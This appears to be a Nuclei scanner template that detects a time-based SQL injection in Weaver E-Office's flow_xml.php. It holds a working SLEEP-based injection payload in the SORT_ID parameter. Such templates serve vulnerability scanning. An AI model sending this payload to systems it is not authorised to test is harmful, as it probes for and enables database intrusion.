id: poc-yaml-weaver-e-office-flow-xml-sqli
info:
  name: 泛微E-Office flow_xml.php SQL注入漏洞
  author: ProjectDiscoveryAI
  severity: high
  tags: sql-injection

variables:
  t1: "{{rand_int(5,10)}}"
  t2: "{{to_number(t1) + 1}}"

http:
  - method: GET
    path:
      - "{{BaseURL}}/general/system/workflow/flow_type/flow_xml.php?SORT_ID=1+AND+(SELECT+2329+FROM+(SELECT(SLEEP({{t1}})))URgU)"
    matchers-condition: and
    matchers:
      - type: status
        status:
          - 200
      - type: word
        words:
          - "<?xml version=\"1.0\"?>"
          - "<tree>"
        part: body
      - type: dsl
        dsl:
          - "duration > to_number(t1)"
          - "duration < to_number(t2)"
